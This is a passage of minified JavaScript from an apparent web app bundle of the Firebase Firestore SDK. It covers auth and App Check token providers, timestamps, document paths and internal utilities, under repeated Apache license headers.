p=c.__sm__;if(p){e:{for(const A in p){c=A;break e}c=void 0}(this.i=c)&&(c=this.i,p=p!==null&&c in p?p[c]:void 0),this.data=p}else this.data=c}x(M_,Ea);function N_(){Dt.call(this),this.status=1}x(N_,Dt);function Ma(c){this.g=c}x(Ma,R_),Ma.prototype.ua=function(){g(this.g,"a")},Ma.prototype.ta=function(c){g(this.g,new M_(c))},Ma.prototype.sa=function(c){g(this.g,new N_)},Ma.prototype.ra=function(){g(this.g,"b")},Rh.prototype.createWebChannel=Rh.prototype.g,_r.prototype.send=_r.prototype.o,_r.prototype.open=_r.prototype.m,_r.prototype.close=_r.prototype.close,W2=function(){return new Rh},z2=function(){return At()},F2=pt,fy={mb:0,pb:1,qb:2,Jb:3,Ob:4,Lb:5,Mb:6,Kb:7,Ib:8,Nb:9,PROXY:10,NOPROXY:11,Gb:12,Cb:13,Db:14,Bb:15,Eb:16,Fb:17,ib:18,hb:19,jb:20},bt.NO_ERROR=0,bt.TIMEOUT=8,bt.HTTP_ERROR=6,Lf=bt,fc.COMPLETE="complete",V2=fc,Vt.EventType=_t,_t.OPEN="a",_t.CLOSE="b",_t.ERROR="c",_t.MESSAGE="d",P.prototype.listen=P.prototype.K,zc=Vt,Jt.prototype.listenOnce=Jt.prototype.L,Jt.prototype.getLastError=Jt.prototype.Ka,Jt.prototype.getLastErrorCode=Jt.prototype.Ba,Jt.prototype.getStatus=Jt.prototype.Z,Jt.prototype.getResponseJson=Jt.prototype.Oa,Jt.prototype.getResponseText=Jt.prototype.oa,Jt.prototype.send=Jt.prototype.ea,Jt.prototype.setWithCredentials=Jt.prototype.Ha,j2=Jt}).apply(typeof af<"u"?af:typeof self<"u"?self:typeof window<"u"?window:{});const II="@firebase/firestore",SI="4.7.10";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Zn{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}Zn.UNAUTHENTICATED=new Zn(null),Zn.GOOGLE_CREDENTIALS=new Zn("google-credentials-uid"),Zn.FIRST_PARTY=new Zn("first-party-uid"),Zn.MOCK_USER=new Zn("mock-user");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let rc="11.5.0";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const aa=new cv("@firebase/firestore");function ja(){return aa.logLevel}function me(n,...e){if(aa.logLevel<=Qe.DEBUG){const t=e.map(Ev);aa.debug(`Firestore (${rc}): ${n}`,...t)}}function fs(n,...e){if(aa.logLevel<=Qe.ERROR){const t=e.map(Ev);aa.error(`Firestore (${rc}): ${n}`,...t)}}function Bl(n,...e){if(aa.logLevel<=Qe.WARN){const t=e.map(Ev);aa.warn(`Firestore (${rc}): ${n}`,...t)}}function Ev(n){if(typeof n=="string")return n;try{/**
* @license
* Copyright 2020 Google LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/return function(t){return JSON.stringify(t)}(n)}catch{return n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Me(n="Unexpected state"){const e=`FIRESTORE (${rc}) INTERNAL ASSERTION FAILED: `+n;throw fs(e),new Error(e)}function st(n,e){n||Me()}function Be(n,e){return n}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ie={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class we extends gs{constructor(e,t){super(e,t),this.code=e,this.message=t,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ns{constructor(){this.promise=new Promise((e,t)=>{this.resolve=e,this.reject=t})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $2{constructor(e,t){this.user=t,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class tV{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,t){e.enqueueRetryable(()=>t(Zn.UNAUTHENTICATED))}shutdown(){}}class nV{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,t){this.changeListener=t,e.enqueueRetryable(()=>t(this.token.user))}shutdown(){this.changeListener=null}}class rV{constructor(e){this.t=e,this.currentUser=Zn.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,t){st(this.o===void 0);let r=this.i;const i=l=>this.i!==r?(r=this.i,t(l)):Promise.resolve();let s=new ns;this.o=()=>{this.i++,this.currentUser=this.u(),s.resolve(),s=new ns,e.enqueueRetryable(()=>i(this.currentUser))};const o=()=>{const l=s;e.enqueueRetryable(async()=>{await l.promise,await i(this.currentUser)})},a=l=>{me("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=l,this.o&&(this.auth.addAuthTokenListener(this.o),o())};this.t.onInit(l=>a(l)),setTimeout(()=>{if(!this.auth){const l=this.t.getImmediate({optional:!0});l?a(l):(me("FirebaseAuthCredentialsProvider","Auth not yet detected"),s.resolve(),s=new ns)}},0),o()}getToken(){const e=this.i,t=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(t).then(r=>this.i!==e?(me("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):r?(st(typeof r.accessToken=="string"),new $2(r.accessToken,this.currentUser)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return st(e===null||typeof e=="string"),new Zn(e)}}class iV{constructor(e,t,r){this.l=e,this.h=t,this.P=r,this.type="FirstParty",this.user=Zn.FIRST_PARTY,this.T=new Map}I(){return this.P?this.P():null}get headers(){this.T.set("X-Goog-AuthUser",this.l);const e=this.I();return e&&this.T.set("Authorization",e),this.h&&this.T.set("X-Goog-Iam-Authorization-Token",this.h),this.T}}class sV{constructor(e,t,r){this.l=e,this.h=t,this.P=r}getToken(){return Promise.resolve(new iV(this.l,this.h,this.P))}start(e,t){e.enqueueRetryable(()=>t(Zn.FIRST_PARTY))}shutdown(){}invalidateToken(){}}class TI{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class oV{constructor(e,t){this.A=t,this.forceRefresh=!1,this.appCheck=null,this.R=null,this.V=null,ii(e)&&e.settings.appCheckToken&&(this.V=e.settings.appCheckToken)}start(e,t){st(this.o===void 0);const r=s=>{s.error!=null&&me("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${s.error.message}`);const o=s.token!==this.R;return this.R=s.token,me("FirebaseAppCheckTokenProvider",`Received ${o?"new":"existing"} token.`),o?t(s.token):Promise.resolve()};this.o=s=>{e.enqueueRetryable(()=>r(s))};const i=s=>{me("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=s,this.o&&this.appCheck.addTokenListener(this.o)};this.A.onInit(s=>i(s)),setTimeout(()=>{if(!this.appCheck){const s=this.A.getImmediate({optional:!0});s?i(s):me("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}},0)}getToken(){if(this.V)return Promise.resolve(new TI(this.V));const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then(t=>t?(st(typeof t.token=="string"),this.R=t.token,new TI(t.token)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function aV(n){const e=typeof self<"u"&&(self.crypto||self.msCrypto),t=new Uint8Array(n);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(t);else for(let r=0;r<n;r++)t[r]=Math.floor(256*Math.random());return t}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function H2(){return new TextEncoder}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class q2{static newId(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=62*Math.floor(4.129032258064516);let r="";for(;r.length<20;){const i=aV(40);for(let s=0;s<i.length;++s)r.length<20&&i[s]<t&&(r+=e.charAt(i[s]%62))}return r}}function $e(n,e){return n<e?-1:n>e?1:0}function dy(n,e){let t=0;for(;t<n.length&&t<e.length;){const r=n.codePointAt(t),i=e.codePointAt(t);if(r!==i){if(r<128&&i<128)return $e(r,i);{const s=H2(),o=lV(s.encode(AI(n,t)),s.encode(AI(e,t)));return o!==0?o:$e(r,i)}}t+=r>65535?2:1}return $e(n.length,e.length)}function AI(n,e){return n.codePointAt(e)>65535?n.substring(e,e+2):n.substring(e,e+1)}function lV(n,e){for(let t=0;t<n.length&&t<e.length;++t)if(n[t]!==e[t])return $e(n[t],e[t]);return $e(n.length,e.length)}function Ul(n,e,t){return n.length===e.length&&n.every((r,i)=>t(r,e[i]))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const bI=-62135596800,xI=1e6;class mn{static now(){return mn.fromMillis(Date.now())}static fromDate(e){return mn.fromMillis(e.getTime())}static fromMillis(e){const t=Math.floor(e/1e3),r=Math.floor((e-1e3*t)*xI);return new mn(t,r)}constructor(e,t){if(this.seconds=e,this.nanoseconds=t,t<0)throw new we(ie.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(t>=1e9)throw new we(ie.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(e<bI)throw new we(ie.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new we(ie.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/xI}_compareTo(e){return this.seconds===e.seconds?$e(this.nanoseconds,e.nanoseconds):$e(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{seconds:this.seconds,nanoseconds:this.nanoseconds}}valueOf(){const e=this.seconds-bI;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class De{static fromTimestamp(e){return new De(e)}static min(){return new De(new mn(0,0))}static max(){return new De(new mn(253402300799,999999999))}constructor(e){this.timestamp=e}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kI="__name__";class vi{constructor(e,t,r){t===void 0?t=0:t>e.length&&Me(),r===void 0?r=e.length-t:r>e.length-t&&Me(),this.segments=e,this.offset=t,this.len=r}get length(){return this.len}isEqual(e){return vi.comparator(this,e)===0}child(e){const t=this.segments.slice(this.offset,this.limit());return e instanceof vi?e.forEach(r=>{t.push(r)}):t.push(e),this.construct(t)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}forEach(e){for(let t=this.offset,r=this.limit();t<r;t++)e(this.segments[t])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,t){const r=Math.min(e.length,t.length);for(let i=0;i<r;i++){const s=vi.compareSegments(e.get(i),t.get(i));if(s!==0)return s}return $e(e.length,t.length)}static compareSegments(e,t){const r=vi.isNumericId(e),i=vi.isNumericId(t);return r&&!i?-1:!r&&i?1:r&&i?vi.extractNumericId(e).compare(vi.extractNumericId(t)):dy(e,t)}static isNumericId(e){return e.startsWith("__id")&&e.endsWith("__")}static extractNumericId(e){return io.fromString(e.substring(4,e.length-2))}}class Mt extends vi{construct(e,t,r){return new Mt(e,t,r)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){const t=[];for(const r of e){if(r.indexOf("//")>=0)throw new we(ie.INVALID_ARGUMENT,`Invalid segment (${r}). Paths must not contain // in them.`);t.push(...r.split("/").filter(i=>i.length>0))}return new Mt(t)}static emptyPath(){return new Mt([])}}const cV=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class Bn extends vi{construct(e,t,r){return new Bn(e,t,r)}static isValidIdentifier(e){return cV.test(e)}canonicalString(){return this.toArray().map(e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),Bn.isValidIdentifier(e)||(e="`"+e+"`"),e)).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)===kI}static keyField(){return new Bn([kI])}static fromServerFormat(e){const t=[];let r="",i=0;const s=()=>{if(r.length===0)throw new we(ie.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);t.push(r),r=""};let o=!1;for(;i<e.length;){const a=e[i];if(a==="\\"){if(i+1===e.length)throw new we(ie.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const l=e[i+1];if(l!=="\\"&&l!=="."&&l!=="`")throw new we(ie.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);r+=l,i+=2}else a==="`"?(o=!o,i++):a!=="."||o?(r+=a,i++):(s(),i++)}if(s(),o)throw new we(ie.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new Bn(t)}static emptyPath(){return new Bn([])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Se{constructor(e){this.path=e}static fromPath(e){return new Se(Mt.fromString(e))}static fromName(e){return new Se(Mt.fromString(e).popFirst(5))}static empty(){return new Se(Mt.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&Mt.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,t){return Mt.comparator(e.path,t.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new Se(new Mt(e.slice()))}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const zu=-1;function uV(n,e){const t=n.toTimestamp().seconds,r=n.toTimestamp().nanoseconds+1,i=De.fromTimestamp(r===1e9?new mn(t+1,0):new mn(t,r));return new lo(i,Se.empty(),e)}function hV(n){return new lo(n.readTime,n.key,zu)}class lo{constructor(e,t,r){this.readTime=e,this.documentKey=t,this.largestBatchId=r}static min(){return new lo(De.min(),Se.empty(),zu)}static max(){return new lo(De.max(),Se.empty(),zu)}}function fV(n,e){let t=n.readTime.compareTo(e.readTime);return t!==0?t:(t=Se.comparator(n.documentKey,e.documentKey),t!==0?t:$e(n.largestBatchId,e.largestBatchId))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const dV="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class pV{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach(e=>e())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function ic(n){if(n.code!==ie.FAILED_PRECONDITION||n.message!==dV)throw n;me("LocalStore","Unexpectedly lost primary lease")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class re{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e(t=>{this.isDone=!0,this.result=t,this.nextCallback&&this.nextCallback(t)},t=>{this.isDone=!0,this.error=t,this.catchCallback&&this.catchCallback(t)})}catch(e){return this.next(void 0,e)}next(e,t){return this.callbackAttached&&Me(),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(t,this.error):this.wrapSuccess(e,this.result):new re((r,i)=>{this.nextCallback=s=>{this.wrapSuccess(e,s).next(r,i)},this.catchCallback=s=>{this.wrapFailure(t,s).next(r,i)}})}toPromise(){return new Promise((e,t)=>{this.next(e,t)})}wrapUserFunction(e){try{const t=e();return t instanceof re?t:re.resolve(t)}catch(t){return re.reject(t)}}wrapSuccess(e,t){return e?this.wrapUserFunction(()=>e(t)):re.resolve(t)}wrapFailure(e,t){return e?this.wrapUserFunction(()=>e(t)):re.reject(t)}static resolve(e){return new re((t,r)=>{t(e)})}static reject(e){return new re((t,r)=>{r(e)})}static waitFor(e){return new re((t,r)=>{let i=0,s=0,o=!1;e.forEach(a=>{++i,a.next(()=>{++s,o&&s===i&&t()},l=>r(l))}),o=!0,s===i&&t()})}static or(e){let t=re.resolve(!1);for(const r of e)t=t.next(i=>i?re.resolve(i):r());return t}static forEach(e,t){const r=[];return e.forEach((i,s)=>{r.push(t.call(this,i,s))}),this.waitFor(r)}static mapArray(e,t){return new re((r,i)=>{const s=e.length,o=new Array(s);let a=0;for(let l=0;l<s;l++){const u=l;t(e[u]).next(h=>{o[u]=h,++a,a===s&&r(o)},h=>i(h))}})}static doWhile(e,t){return new re((r,i)=>{const s=()=>{e()===!0?t().next(()=>{s()},i):r()};s()})}}function gV(n){const e=n.match(/Android ([\d.]+)/i),t=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(t)}function sc(n){return n.name==="IndexedDbTransactionError"}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fp{constructor(e,t){this.previousValue=e,t&&(t.sequenceNumberHandler=r=>this.oe(r),this._e=r=>t.writeSequenceNumber(r))}oe(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this._e&&this._e(e),e}}Fp.ae=-1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Iv=-1;function zp(n){return n==null}function Ld(n){return n===0&&1/n==-1/0}function mV(n){return typeof n=="number"&&Number.isInteger(n)&&!Ld(n)&&n<=Number.MAX_SAFE_INTEGER&&n>=Number.MIN_SAFE_INTEGER}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const K2="";function yV(n){let e="";for(let t=0;t<n.length;t++)e.length>0&&(e=CI(e)),e=wV(n.get(t),e);return CI(e)}function wV(n,e){let t=e;const r=n.length;for(let i=0;i<r;i++){const s=n.charAt(i);switch(s){case"\0":t+="";break;case K2:t+="";break;default:t+=s}}return t}function CI(n){return n+K2+""}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function RI(n){let e=0;for(const t in n)Object.prototype.hasOwnProperty.call(n,t)&&e++;return e}function _o(n,e){for(const t in n)Object.prototype.hasOwnProperty.call(n,t)&&e(t,n[t])}function G2(n){for(const e in n)if(Object.prototype.hasOwnProperty.call(n,e))return!1;return!0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
